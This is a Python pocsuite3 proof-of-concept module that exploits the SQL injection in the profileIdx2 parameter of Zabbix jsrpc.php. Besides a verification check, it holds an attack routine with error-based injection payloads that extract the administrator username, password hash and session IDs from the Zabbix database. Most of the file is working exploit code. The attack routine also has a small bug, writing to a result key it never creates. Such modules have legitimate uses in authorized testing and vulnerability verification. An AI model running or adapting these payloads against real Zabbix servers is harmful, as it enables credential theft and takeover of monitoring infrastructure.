#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
import re
from urllib import parse

class Zabbix(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-06'
    updateDate = '2019-11-06'
    references = ['']
    name = 'Zabbix 2.2 < 3.0.3 - jsrpc 参数profileIdx2 insert注入漏洞'
    appPowerLink = ''
    appName = 'Zabbix'
    appVersion = 'Zabbix 2.2 < 3.0.3'
    vulType = 'SQL Injection'
    desc = ''' 
    Zabbix 2.2 < 3.0.3 - jsrpc 参数profileIdx2 insert注入漏洞
    '''

    def _verify(self):
        result = {}
        payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        try:
            if self.url[-1] == '/':
                url = self.url + payload
            else:
                url = self.url + '/' + payload
            response = requests.get(url, timeout=10)
            key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
            if key_reg.findall(response.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _sql_inject(self, sql):
        payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + parse.quote(
            sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        if self.url[-1] == '/':
            url = self.url + payload
        else:
            url = self.url + '/' + payload
        try:
            reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            response = requests.get(url, timeout=10)
            result = reg.findall(response.text)
            if result:
                return result[0]
        except Exception as e:
            logger.info(e)
        return False

    def _attack(self):
        result = {}
        passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
        session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
        res = self._sql_inject(passwd_sql)
        if res:
            res = res.split(':')
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = passwd_sql
            result['VerifyInfo']['Payload2'] = session_sql
            result['AdminInfo']['Username'] = res[0]
            result['AdminInfo']['Password'] = res[1]
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Zabbix)